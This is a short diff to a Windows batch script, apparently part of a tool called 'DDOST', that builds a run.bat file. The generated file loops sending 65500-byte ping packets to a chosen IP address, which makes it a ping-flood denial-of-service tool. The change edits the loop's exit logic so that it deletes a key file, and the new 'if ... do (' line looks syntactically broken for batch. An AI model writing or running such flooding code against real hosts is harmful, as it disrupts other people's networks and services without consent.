@@ -19,7 +19,9 @@ if exist %userprofile%\key goto skip
       echo :loop>>"%temp%\DDOST\run.bat"
       echo ping %ip% -n 1 -l 65500>>"%temp%\DDOST\run.bat"
       echo call "%userprofile%\.ddost\data\exitkey.bat">>"%temp%\DDOST\run.bat"
-      echo if "%exit%"=="true" exit>>"%temp%\DDOST\run.bat"
+      echo if "%exit%"=="true" do (>>"%temp%\DDOST\run.bat"
+      echo exit>>"%temp%\DDOST\run.bat"
+      echo del /q "%userprofile%\.ddost\data\exitkey.bat">>"%temp%\DDOST\run.bat"
       echo goto loop>>"%temp%\DDOST\run.bat"
       echo Minimize Windows (Y/N):
   set /p mintf=
